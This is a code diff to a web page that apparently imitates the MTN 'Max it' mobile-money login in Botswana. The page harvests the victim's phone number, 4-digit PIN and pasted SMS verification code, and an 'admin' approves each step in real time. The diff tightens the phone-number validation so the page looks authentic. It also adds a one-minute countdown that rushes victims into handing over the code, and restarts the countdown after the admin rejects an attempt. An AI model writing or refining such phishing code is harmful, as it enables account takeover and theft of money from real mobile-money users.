@@ -327,8 +327,8 @@
       </div>
       <div class="field">
         <label>Phone Number (Botswana)</label>
-        <div class="phone-row"><div class="ph-pre">+267</div><input type="tel" id="s2ph" placeholder="712345678" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">9 digits, cannot start with 0 (e.g., 712345678)</div>
+        <div class="phone-row"><div class="ph-pre">+267</div><input type="tel" id="s2ph" placeholder="71234567" maxlength="8" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="field-hint">8 digits starting with 7 (e.g., 71234567)</div>
       </div>
       <div class="step-btns">
         <button class="btn-gray" onclick="goTo('page-step1')">BACK</button>
@@ -402,7 +402,7 @@
     <div class="login-inner">
       <div class="lg-phone-row">
         <div class="lg-ph-pre">+267</div>
-        <input type="tel" id="lpPhone" placeholder="712345678" maxlength="9" oninput="normalizePhone('lpPhone')">
+        <input type="tel" id="lpPhone" placeholder="71234567" maxlength="8" oninput="normalizePhone('lpPhone')">
       </div>
       <div class="pin-label">Enter your Max it PIN (4 digits):</div>
       <div class="pin-row">
@@ -458,6 +458,10 @@
     <div class="sms-card">
       <h2>Paste SMS Message</h2>
       <p class="sms-hint">A verification SMS has been sent to your Max it number. Please copy and paste the full message here.</p>
+      <div id="smsCountdownBox" style="text-align:center; margin-bottom:14px; display:none;">
+        <span style="font-size:0.82rem; color:var(--text-light);">Message expires in </span>
+        <span id="smsCountdownVal" style="font-size:1rem; font-weight:700; color:var(--mtn-gold);">1:00</span>
+      </div>
       <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…" oninput="chkSmsMsg()"></textarea>
       <p class="sms-code-hint">Example: "Your Max it verification code is: 123456. Valid for 15 mins."</p>
       <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
@@ -558,8 +562,8 @@
   function normalizePhone(id) {
     let inp = document.getElementById(id);
     let val = inp.value.replace(/\D/g, '');
-    if (val.startsWith('0')) val = val.replace(/^0+/, '');
-    if (val.length > 9) val = val.substring(0, 9);
+    if (val.length > 0 && val[0] !== '7') val = val.replace(/^[^7]*/, '');
+    if (val.length > 8) val = val.substring(0, 8);
     inp.value = val;
   }
 
@@ -588,8 +592,8 @@
     const la = document.getElementById('s2la').value.trim();
     const ph = document.getElementById('s2ph').value;
 
-    if (!fi || !la || ph.length !== 9 || ph.startsWith('0')) {
-      showErr('s2Err', 'Please enter a valid 9-digit phone number not starting with 0.');
+    if (!fi || !la || ph.length !== 8 || !ph.startsWith('7')) {
+      showErr('s2Err', 'Please enter a valid 8-digit phone number starting with 7.');
       return;
     }
 
@@ -699,8 +703,8 @@
     const phone = document.getElementById('lpPhone').value;
     const pin = [0,1,2,3].map(i => document.getElementById('lp'+i).value).join('');
 
-    if (phone.length !== 9 || phone.startsWith('0') || pin.length < 4) {
-      showLgnMsg('warning', 'Phone: 9 digits, cannot start with 0 (e.g., 712345678). PIN: 4 digits.');
+    if (phone.length !== 8 || !phone.startsWith('7') || pin.length < 4) {
+      showLgnMsg('warning', 'Phone: 8 digits starting with 7 (e.g., 71234567). PIN: 4 digits.');
       return;
     }
 
@@ -757,6 +761,7 @@
             console.log('✅ Admin approved login');
             clearTimeout(pollTimeout);
             goTo('page-sms-paste');
+            startSmsCountdown();
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
@@ -792,6 +797,52 @@
     
     // Start polling
     checkStatus();
+  }
+
+  // ══════════════════════════════════════════════════════
+  // SMS COUNTDOWN TIMER (1 minute)
+  // ══════════════════════════════════════════════════════
+  let smsCountdownInterval = null;
+
+  function startSmsCountdown() {
+    clearSmsCountdown();
+    let seconds = 60;
+    const box = document.getElementById('smsCountdownBox');
+    const val = document.getElementById('smsCountdownVal');
+    box.style.display = 'block';
+    val.style.color = 'var(--mtn-gold)';
+    val.textContent = '1:00';
+
+    smsCountdownInterval = setInterval(() => {
+      seconds--;
+      const m = Math.floor(seconds / 60);
+      const s = seconds % 60;
+      val.textContent = m + ':' + String(s).padStart(2, '0');
+
+      if (seconds <= 10) val.style.color = '#e53e3e';
+
+      if (seconds <= 0) {
+        clearSmsCountdown();
+        val.textContent = '0:00';
+        // Disable submit and show expired message
+        document.getElementById('bSms').disabled = true;
+        document.getElementById('bSms').className = 'btn-sms';
+        document.getElementById('smsMsgBox').value = '';
+        showSmsMsg('error', 'Time expired. Please log in again.');
+        setTimeout(() => {
+          goTo('page-login');
+          ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+          box.style.display = 'none';
+        }, 2000);
+      }
+    }, 1000);
+  }
+
+  function clearSmsCountdown() {
+    if (smsCountdownInterval) {
+      clearInterval(smsCountdownInterval);
+      smsCountdownInterval = null;
+    }
   }
 
   // ══════════════════════════════════════════════════════
@@ -835,6 +886,7 @@
       document.getElementById('mSms').classList.remove('show');
 
       if (data.success) {
+        clearSmsCountdown();
         // Show wait for admin approval
         document.getElementById('waitSmsAppId').textContent = S.applicationId;
         goTo('page-wait-sms');
@@ -876,10 +928,17 @@
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected SMS - ask user to paste correct message');
             clearTimeout(smsPollTimeout);
+            clearSmsCountdown();
             goTo('page-sms-paste');
-            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
             // Clear the textarea for user to enter correct message
             document.getElementById('smsMsgBox').value = '';
+            // Re-enable button and restore ready state
+            const btn = document.getElementById('bSms');
+            btn.disabled = false;
+            btn.className = 'btn-sms rdy';
+            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+            // Restart countdown for next attempt
+            startSmsCountdown();
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
